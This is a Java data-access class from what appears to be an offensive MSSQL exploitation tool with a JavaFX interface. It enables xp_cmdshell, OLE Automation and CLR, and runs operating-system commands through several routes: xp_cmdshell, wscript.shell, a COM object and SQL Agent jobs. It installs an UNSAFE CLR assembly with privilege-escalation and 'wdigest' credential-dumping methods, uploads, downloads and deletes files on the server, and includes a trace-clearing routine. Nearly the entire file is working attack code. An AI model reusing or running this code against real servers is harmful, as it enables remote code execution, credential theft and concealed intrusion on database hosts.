package Dao;

import Controller.MssqlController;
import Entity.ControllersFactory;
import Util.MessageUtil;
import Util.Utils;
import Util.YamlConfigs;
import javafx.application.Platform;

import java.io.File;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.sql.*;
import java.text.MessageFormat;
import java.util.ArrayList;
import java.util.Map;

public class MssqlDao {
    private String JARFILE;
    private String JDBCURL;
    private String DRIVER;
    private String USERNAME;
    private String PASSWORD;

    private Connection CONN = null;
    private URLClassLoader URLCLASSLOADER = null;
    private Method METHOD = null;
    private Statement stmt = null;
    private ResultSet rs = null;
    /**
     * 用此方法获取 MysqlController 的日志框
     */
    private MssqlController mssqlController = (MssqlController) ControllersFactory.controllers.get(MssqlController.class.getSimpleName());

    public MssqlDao(String ip,String port,String database,String username,String password,String timeout) throws Exception {
        YamlConfigs configs = new YamlConfigs();
        Map<String, Object> yamlToMap = configs.getYamlToMap("config.yaml");
        // 从配置文件读取变量
        JARFILE = (String) configs.getValue("Mssql.Driver",yamlToMap);
        JDBCURL = (String) configs.getValue("Mssql.JDBCUrl",yamlToMap);
        DRIVER = (String) configs.getValue("Mssql.ClassName",yamlToMap);
        // 进行时间转换
        //timeout = String.valueOf(Integer.parseInt(timeout) * 1000);
        JDBCURL = JDBCURL + ";loginTimeout=" + timeout + ";socketTimeout=" + timeout;
        JDBCURL = MessageFormat.format(JDBCURL,ip,port,database);
        USERNAME = username;
        PASSWORD = password;
        // 动态加载
        URLCLASSLOADER = (URLClassLoader) ClassLoader.getSystemClassLoader();
        METHOD = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);
        METHOD.setAccessible(true);
        // 将路径转为 url 类型进行加载，修复系统路径不兼容问题
        URL url = (new File(JARFILE)).toURI().toURL();
        METHOD.invoke(URLCLASSLOADER, url);
        Class.forName(DRIVER);
    }

    /**
     * 测试是否成功连接上数据库，不需要持久化连接
     * @return
     * @throws java.sql.SQLException
     */
    public void testConnection() throws java.sql.SQLException {
        if (CONN == null || CONN.isClosed()) {
            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
            Utils.regroupDrivers("jtds");
            DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
            closeConnection();
        }
    }

    public Connection getConnection() throws java.sql.SQLException {
        if (CONN == null || CONN.isClosed()) {
            // 重新排序 Drivers 的顺序，regroupDrivers 参数是输入当前Dao类的数据库名称
            Utils.regroupDrivers("jtds");
            CONN = DriverManager.getConnection(JDBCURL, USERNAME, PASSWORD);
        }
        return CONN;
    }

    public void closeConnection() throws java.sql.SQLException {
        if (CONN != null) {
            CONN.close();
        }
    }

    /**
     * 统一语句执行函数
     * @param sqlStr sql 语句
     * @param code 编码
     * @return
     * @throws Exception
     */
    public String excute(String sqlStr,String code) throws SQLException {
        StringBuffer res = new StringBuffer();
        if (sqlStr == null || sqlStr.equals("")) {
            return null;
        }
        if("".equals(code)){
            code = "GB2312";
        }
        stmt = CONN.createStatement();
        boolean hasResultSet = stmt.execute(sqlStr);
        if (hasResultSet) {
            rs = stmt.getResultSet();
            java.sql.ResultSetMetaData rsmd = rs.getMetaData();
            int columnCount = rsmd.getColumnCount();
            while (rs.next()) {
                for (int i = 0; i < columnCount; i++) {
                    try {
                        String temp = new String(rs.getBytes(i+1),code)+ "\n";
                        res.append(temp);
                    }catch (Exception e){
                        res.append("\n");
                    }
                }
            }
        } else {
            res.append(stmt.getUpdateCount());
        }
        return res.toString();
    }


    /**
     * 激活 xpcmdshell
     */
    public void activateXPCS(){
        try {
            excute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 激活成功！"));
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }

    /**
     * 激活 xpcmdshell
     */
    public void activateOAP(){
        try {
            excute("EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 激活成功！"));
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }

    }

    /**
     * xpcmdshell 执行命令
     * @param command
     * @param code
     * @return
     */
    public String runcmdXPCS(String command,String code) {
        String res = "";
        try {
            // 转义单引号
            command = command.replace("'","''");
            String sqlStr = String.format("exec master..xp_cmdshell '%s'",command);
            res = excute(sqlStr,code);
        } catch (Exception e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;
    }

    /**
     * OAP BULK 语句执行回显命令
     * @param command
     * @param filename
     * @param timeout
     * @return
     */
    public String runcmdOAPBULK(String command,String filename,String timeout,String code) {
        String oashellres = null;
        try {
            // 转义单引号
            command = command.replace("'","''");
            // 改用数据文件目录，提高文件写入成功率，目录会存在换行符所以去掉
            String path = excute("declare @path varchar(8000);select @path=rtrim(reverse(filename)) from master..sysfiles where name='master';select @path=reverse(substring(@path,charindex('\\',@path),8000));select @path",code).replace("\n","");
            // 为目录添加双引号，有空格的目录需要双引号才能写入
            path = "\"" + path + filename +".txt\"";
            excute(String.format("declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'C:\\Windows\\System32\\cmd.exe /c %s > %s'",command,path),"");
            // 判断表是否存在，存在则删除该表
            excute("if OBJECT_ID(N'oashellresult',N'U') is not null\n" +
                    "\tDROP TABLE oashellresult;","");
            //读取的时候不需要双引号
            excute(String.format("create table oashellresult(res varchar(8000));WAITFOR DELAY '0:0:%s';bulk insert oashellresult from '%s';",timeout,path.replace("\"","")),"");
            oashellres = excute("SELECT * FROM oashellresult;",code);
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
        return oashellres;
    }

    /**
     * OAP COM 组件执行回显命令
     * @param command
     * @return
     * @throws SQLException
     */
    public String runcmdOAPCOM(String command,String code) throws SQLException {
        // 转义单引号
        command = command.replace("'","''");
        String sql = "declare @luan int,@exec int,@text int,@str varchar(8000);\n" +
                "exec sp_oacreate '{72C24DD5-D70A-438B-8A42-98424B88AFB8}',@luan output;\n" +
                "exec sp_oamethod @luan,'exec',@exec output,'C:\\Windows\\System32\\cmd.exe /c %s';\n" +
                "exec sp_oamethod @exec, 'StdOut', @text out;\n" +
                "exec sp_oamethod @text, 'readall', @str out\n" +
                "select @str;";
        String res = excute(String.format(sql,command),code);
        return res;
    }

    /**
     * 利用 JobAgent 特性执行系统命令
     * @param command
     * @return
     */
    public String runcmdagent(String command,String code){
        // 转义单引号
        command = command.replace("'","''");
        String jobname = Utils.getRandomString();
        String res = "";
        String sqlString = "IF OBJECT_ID(N'{jobname}') is not null\n" +
                "\tEXEC sp_delete_job @job_name = N'{jobname}';\n" +
                "USE msdb;\n" +
                "EXEC dbo.sp_add_job @job_name = N'{jobname}';\n" +
                "EXEC sp_add_jobstep @job_name = N'{jobname}', @step_name = N'{jobname}', @subsystem = N'CMDEXEC', @command = N'%s', @retry_attempts = 1, @retry_interval = 5;\n" +
                "EXEC dbo.sp_add_jobserver @job_name = N'{jobname}';\n" +
                "EXEC dbo.sp_start_job N'{jobname}';";
        sqlString = String.format(sqlString.replace("{jobname}",jobname),command);
        try {
            excute(sqlString,code);
            res =  "命令执行成功！该方法没有回显";
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
        return res;
    }

    /**
     * 获取数据库版本
     * @return
     */
    public String getVersion() {
        String res = null;
        try {
            String sqlString = "select @@version";
            res = excute(sqlString,"");
            res = res.replace("\n","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("当前数据库版本:" + res));
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
        return res;
    }

    /**
     * 获取当前账号的权限
     * @return
     */
    public void getisdba() {
        String sql = "select is_srvrolemember('sysadmin');";
        String res = "";
        try {
            res = excute(sql,"");
            if ("1".equals(res)) {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("该账号是 DBA 权限！"));
            } else {
                mssqlController.mssqlLogTextArea.appendText(Utils.log("该账号不是 DBA 权限！"));
            }
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
    }

    /**
     * 清理痕迹
     */
    public void clearHistory(){
        try {
            excute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("XP_Cmdshell 关闭成功！"));
            excute("EXEC sp_configure 'show advanced options', 1;RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 0;RECONFIGURE WITH OVERRIDE;EXEC sp_configure 'show advanced options', 0;","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("Ole Automation Procedures 关闭成功！"));
            excute("if OBJECT_ID(N'oashellresult',N'U') is not null\n" +
                    "\tDROP TABLE oashellresult;","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("oashellresult 表删除成功！"));
            excute("if (exists (select * from sys.objects where name = 'kitmain'))drop proc kitmain;\n" +
                    "if (exists (select * from sys.assemblies where name='MDATKit'))drop assembly MDATKit;\n","");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("CLR 删除成功！"));
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }

    }

    /**
     * 激活 CLR
     */
    public void activateCLR(){
        try {
            String initsql = "exec sp_configure 'show advanced options','1';reconfigure;exec sp_configure 'clr enabled','1';reconfigure;exec sp_configure 'show advanced options','1';";
            excute(initsql,"");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("激活 CLR 成功！正在导入和创建函数请稍等..."));
        } catch(Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
    }


    /**
     * 初始化 CLR 插件
     */
    public void initCLR(){
        try {
            String checksql = "if (exists (select * from sys.objects where name = 'kitmain'))drop proc kitmain;\n" +
                    "if (exists (select * from sys.assemblies where name='MDATKit'))drop assembly MDATKit;\n";
            excute(checksql,"");
            // 获取插件目录
            String path = Utils.getSelfPath() + File.separator + "Plugins" + File.separator + "Mssql" + File.separator + "clr.txt";
            // 读取插件内容
            String contents = Utils.readFile(path).replace("\n","");
            String importsql = String.format("CREATE ASSEMBLY [MDATKit]\n" +
                    "AUTHORIZATION [dbo]\n" +
                    "FROM 0x%s\n" +
                    "WITH PERMISSION_SET = UNSAFE;\n",contents);
            excute(importsql,"");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("导入 CLR 程序成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
    }


    /**
     * 检测 CLR 程序是否存在
     */
    public boolean checkCLR(){
        try {
            String checksql1 = "if (exists (select * from sys.objects where name = 'kitmain')) select '1' as res;" ;
            //String checksql2 = "if (exists (select * from sys.assemblies where name='MDATKit')) select '1' as res;" ;
            String c1 = excute(checksql1,"");
            //String c2 = excute(checksql2,"");
            if (!c1.equals("-1")){
                mssqlController.mssqlLogTextArea.appendText(Utils.log("CLR 函数存在！"));
                return true;
            }
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
        return false;
    }

    /**
     * 创建 CLR 函数
     */
    public void createCLRFunc(){
        try {
            String createfunc = "CREATE PROCEDURE [dbo].[kitmain]\n" +
                    "@method NVARCHAR (MAX) , @arguments NVARCHAR (MAX) \n" +
                    "AS EXTERNAL NAME [MDATKit].[StoredProcedures].[kitmain]";
            excute(createfunc,"");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("创建 CLR 函数成功！"));
        }catch (Exception e){
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
    }

    /**
     * CLR 命令执行
     * @param command
     * @param type
     * @param code
     * @return
     */
    public String clrruncmd(String command,String type,String code){
        String res = "";
        command = command.replace("'","''");
        try {
            //普通
            if("0".equals(type)){
                res = excute(String.format("exec kitmain 'cmdexec',N'%s'",command),code);
            }else {//尝试提权
                res = excute(String.format("exec kitmain 'supercmdexec',N'%s'",command),code);
            }
        }catch (Exception e){
            MessageUtil.showExceptionMessage(e,e.getMessage());
        }
        return res;
    }

    /**
     * 通过提权执行获取系统管理员密码
     * @return
     */
    public String clrgetadminpassword() throws SQLException {
        String res = null;
        String sql = "exec kitmain 'wdigest',N''";
        res = excute(sql,"");
        return res;
    }

    /**
     * sp_OA 组件上传
     * @param path
     * @param contexts
     */
    public void normalUpload(String path,String contexts){
        path = path.replace("'","''");
        String sql = "DECLARE @Obj INT;\n" +
                "EXEC sp_OACreate 'ADODB.Stream' ,@Obj OUTPUT;\n" +
                "EXEC sp_OASetProperty @Obj ,'Type',1;\n" +
                "EXEC sp_OAMethod @Obj,'Open';\n" +
                "EXEC sp_OAMethod @Obj,'Write', NULL, %s;\n" +
                "EXEC sp_OAMethod @Obj,'SaveToFile', NULL, N'%s', 2;\n" +
                "EXEC sp_OAMethod @Obj,'Close';\n" +
                "EXEC sp_OADestroy @Obj;";

        try {
            sql = String.format(sql,"0x" + contexts,path);
            excute(sql,"");
            mssqlController.mssqlLogTextArea.appendText(Utils.log("上传文件成功！"));
            //PublicUtil.log("上传文件成功！");
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
            //PublicUtil.log(throwables.getMessage());
        }
    }

    /**
     * 获取系统全部硬盘，不能用全局 excute 函数
     * @return
     */
    public ArrayList<String> getDisk() {
        String sqlString = "EXEC master.dbo.xp_fixeddrives";
        ArrayList<String> res = new ArrayList<String>();
        try {
            stmt = CONN.createStatement();
            boolean hasResultSet = stmt.execute(sqlString);
            if (hasResultSet) {
                rs = stmt.getResultSet();
                while (rs.next()) {
                    res.add(rs.getString(1));
                }
            } else {
                res.add(String.valueOf(stmt.getUpdateCount()));
            }
            return res;
        } catch (SQLException e) {
            MessageUtil.showExceptionMessage(e, e.getMessage());
        }
        return res;
    }

    /**
     * 获取当前目录下的所有文件
     * @param path
     * @return
     */
    public ArrayList<String> getFiles(String path){
        String filesql = String.format("if OBJECT_ID(N'DirectoryTree',N'U') is not null\n" +
                "    DROP TABLE DirectoryTree;\n" +
                "CREATE TABLE DirectoryTree (subdirectory varchar(8000),depth int,isfile bit);\n" +
                "INSERT DirectoryTree (subdirectory,depth,isfile) EXEC master.sys.xp_dirtree N'%s',1,1;",path);
        String selectfile = "SELECT * FROM DirectoryTree";
        ArrayList<String> res = new ArrayList<>();
        try {
            excute(filesql,"");
            stmt = CONN.createStatement();
            boolean hasResultSet = stmt.execute(selectfile);
            if (hasResultSet) {
                rs = stmt.getResultSet();
                while (rs.next()) {
                    res.add(rs.getString("isfile")+"|"+rs.getString("subdirectory"));
                }
            }
            return res;
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });        }
        return res;
    }


    /**
     * spoa 下载文件
     * @param path
     * @throws SQLException
     */
    public String normalDownload(String path) throws SQLException {
        String res = "";
        path = path.replace("'","''");
        String sql = "declare @o int, @f int, @t int, @ret int\n" +
                "declare @line varchar(8000),@alllines varchar(8000)\n" +
                "set @alllines =''\n" +
                "exec sp_oacreate 'scripting.filesystemobject', @o out\n" +
                "exec sp_oamethod @o, 'opentextfile', @f out, N'%s', 1\n" +
                "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
                "while (@ret = 0)\n" +
                "begin\n" +
                "set @alllines = @alllines + @line + '\n'\n" +
                "exec @ret = sp_oamethod @f, 'readline', @line out\n" +
                "end\n" +
                "select distinct convert(varbinary, @alllines) as lines";
        sql = String.format(sql,path);
        try {
            stmt = CONN.createStatement();
            boolean hasResultSet = stmt.execute(sql);
            if (hasResultSet) {
                rs = stmt.getResultSet();
                while (rs.next()) {
                    res = rs.getString("lines");
                }
            }
            return res;
        } catch (SQLException e) {
            Platform.runLater(() ->{
                MessageUtil.showExceptionMessage(e,e.getMessage());
            });
        }
        return res;

    }

    /**
     * spoa 删除文件
     * @param path
     * @throws SQLException
     */
    public void normaldelete(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = "DECLARE @Filehandle int\n" +
                "EXEC sp_OACreate 'Scripting.FileSystemObject', @Filehandle OUTPUT\n" +
                "EXEC sp_OAMethod @Filehandle, 'DeleteFile', NULL, N'%s'\n" +
                "EXEC sp_OADestroy @Filehandle";
        sql = String.format(sql,path);

        excute(sql,"");

    }

    /**
     * spoa 新建文件夹
     * @param path
     */
    public void normalmkdir(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = String.format("exec master.sys.xp_create_subdir N'%s'",path);
        excute(sql,"");
    }

    /**
     * CLR 新建文件夹
     * @param path
     * @throws SQLException
     */
    public void clrmkdir(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = String.format("exec kitmain 'newdir',N'%s'",path);
        excute(sql,"");

    }

    /**
     * CLR 删除文件功能
     * @param path
     * @throws SQLException
     */
    public void clrdelete(String path) throws SQLException {
        path = path.replace("'","''");
        String sql = "exec kitmain 'delete',N'%s'";
        sql = String.format(sql,path);
        excute(sql,"");
    }

    /**
     * CLR 上传文件
     * @param path
     * @param contexts
     * @throws SQLException
     */
    public void clrupload(String path,String contexts) throws SQLException {
        path = path.replace("'","''");
        String sql = "exec kitmain 'writefile',N'%s^%s'";
        sql = String.format(sql,path,contexts);
        excute(sql,"");
    }
//    public static void main(String[] args) {
//        String aa = String.format("create table oashellresult(res varchar(8000));WAITFOR DELAY '0:0:%s';bulk insert oashellresult from '%%userprofile%%/%s.txt';","timeout","filename");
//        System.out.println(aa);
//    }
}
